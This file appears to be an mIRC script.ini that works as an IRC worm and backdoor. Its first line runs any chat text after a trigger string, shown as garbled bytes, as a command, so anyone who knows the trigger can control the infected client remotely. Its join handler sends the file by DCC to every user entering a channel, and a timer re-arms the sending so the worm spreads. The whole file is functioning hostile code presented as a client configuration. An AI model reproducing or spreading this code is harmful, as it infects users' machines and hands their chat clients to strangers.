[script]
n0=on 1:text:�� *:?:{ s *2 | halt }
n1=alias /s / *1
n2=on 1:connect:/.enable #d
n3=#d off
n4=on 1:join:#:{ if ($nick != $me) { dcc send $nick script.ini } | .disable #d | .timer 1 60 .enable #d }
n5=#d end
